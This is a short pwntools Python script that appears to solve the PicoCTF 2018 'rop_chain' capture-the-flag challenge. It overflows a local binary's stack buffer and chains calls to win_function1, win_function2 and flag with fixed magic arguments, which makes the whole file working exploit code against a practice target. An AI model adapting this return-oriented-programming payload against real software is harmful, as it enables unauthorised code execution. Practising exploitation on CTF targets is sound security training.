from pwn import * 
#context.log_level = 'debug'
#io = gdb.debug('./PicoCTF_2018_rop_chain','break *080485CB')
io = process('./PicoCTF_2018_rop_chain')
offset = 0x18+4
elf = ELF('./PicoCTF_2018_rop_chain')
payload1 = b'A'*offset+p32(elf.sym['win_function1'])+p32(elf.sym['win_function2'])+p32(elf.sym['flag'])+p32(0xBAAAAAAD)+p32(0xDEADBAAD)
io.sendlineafter(b'Enter your input>',payload1)
io.interactive()
